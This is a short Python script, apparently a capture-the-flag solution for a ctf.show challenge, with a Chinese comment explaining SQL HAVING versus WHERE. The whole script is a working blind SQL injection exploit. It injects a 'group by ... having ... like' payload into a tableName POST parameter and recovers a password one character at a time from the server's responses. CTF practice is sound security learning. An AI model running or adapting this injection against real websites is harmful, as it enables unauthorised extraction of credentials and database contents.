import requests

url = "http://f431d156-0e85-4e5b-a396-6e7840ddb18e.challenge.ctf.show/select-waf.php"
result16 = "0x63"
result = "c"

for i in range(1,50):
    for j in range(38,128):
        payload = f"ctfshow_user group by pass having pass like {result16 + hex(j)[2:]}25"
        print(payload)
        response = requests.request("POST", url=url, data={"tableName":payload})
        #print({"tableName":payload})
        if '$user_count = 1;' in response.text:
            result += chr(j)
            result16 += hex(j)[2:]
            print(result)
            break



"""
having 是从前筛选的字段再筛选，而 where 是从数据表中的字段直接进行的筛选的，
如果已经筛选出了某个字段，这种情况下 having 和 where 等效，但是如果没有 select 某个字段，
后面直接 having 这个字段，就会报错。
"""